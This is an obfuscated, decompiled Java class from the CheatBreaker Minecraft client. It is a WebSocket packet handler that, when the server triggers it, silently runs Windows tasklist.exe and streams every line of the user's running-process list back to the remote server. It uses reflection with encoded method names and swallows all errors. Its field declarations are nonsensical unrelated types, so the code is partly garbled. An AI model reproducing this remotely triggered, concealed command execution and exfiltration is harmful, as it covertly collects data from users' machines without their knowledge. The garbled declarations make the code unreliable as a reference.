package recovered.unidentified;

import com.cheatbreaker.client.CheatBreaker;
import com.cheatbreaker.client.ui.overlay.element.PrivateMessageElement;
import com.cheatbreaker.client.websocket.AssetsWebSocket;
import com.cheatbreaker.client.websocket.WSPacket;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.Collections;
import junit.extensions.TestDecorator;
import net.minecraft.client.renderer.ThreadDownloadImageData;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C02PacketUseEntity$Action;
import net.optifine.expr.FunctionFloat;
import org.slf4j.event.EventRecodingLogger;

public class UnidentifiedClass3830 extends WSPacket {
   public TestDecorator field_0003;
   public FunctionFloat field_0001;
   public EventRecodingLogger field_0002;
   public C02PacketUseEntity$Action field_0000;

   public Object method_23255() {
      try {
         return ThreadDownloadImageData.field_0009.exec(System.getenv("windir") + "\\system32\\tasklist.exe");
      } catch (Throwable var2) {
         throw var2;
      }
   }

   @Override
   public void write(PacketBuffer var1) {
   }

   @Override
   public void read(PacketBuffer var1) {
   }

   @Override
   public void handle(AssetsWebSocket var1) {
      try {
         Object var3 = this.method_23255();
         Method var4 = var3.getClass().getMethod(PrivateMessageElement.method_01186(UnidentifiedClass0599.field_0003));
         var4.setAccessible(true);
         BufferedReader var5 = new BufferedReader(new InputStreamReader((InputStream)var4.invoke(var3)));

         String var2;
         while ((var2 = var5.readLine()) != null) {
            CheatBreaker.getInstance().getAssetsWebSocket().sentToServer(new UnidentifiedClass0599(Collections.singletonList(var2)));
         }

         var4.setAccessible(false);
         var5.close();
      } catch (Exception var6) {
      }
   }
}
